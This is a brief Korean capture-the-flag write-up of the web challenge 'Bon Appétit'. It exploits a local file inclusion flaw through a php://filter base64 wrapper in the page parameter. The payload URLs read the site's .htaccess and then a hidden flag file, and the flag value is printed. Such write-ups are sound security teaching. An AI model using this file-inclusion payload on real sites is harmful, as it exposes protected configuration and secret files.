## Bon Appétit (100)

> We are creating a new web-site for our restaurant. Can you check if it is secure enough?


먼저 `LFI` 공격로 `.htaccess`를 가져온다.

`http://bonappetit.stillhackinganyway.nl/?page=php://filter/convert.base64-encode/resource=.htaccess`

### .htaccess
```
<FilesMatch "\.(htaccess|htpasswd|sqlite|db)$">
 Order Allow,Deny
 Deny from all
</FilesMatch>

<FilesMatch "\.phps$">
 Order Allow,Deny
 Allow from all
</FilesMatch>

<FilesMatch "suP3r_S3kr1t_Fl4G">
  Order Allow,Deny
  Deny from all
</FilesMatch>


# disable directory browsing
Options -Indexes
```

이제는 `suP3r_S3kr1t_Fl4G`를 가져온다.

`http://bonappetit.stillhackinganyway.nl/?page=php://filter/convert.base64-encode/resource=suP3r_S3kr1t_Fl4G`


### flag{82d8173445ea865974fc0569c5c7cf7f}
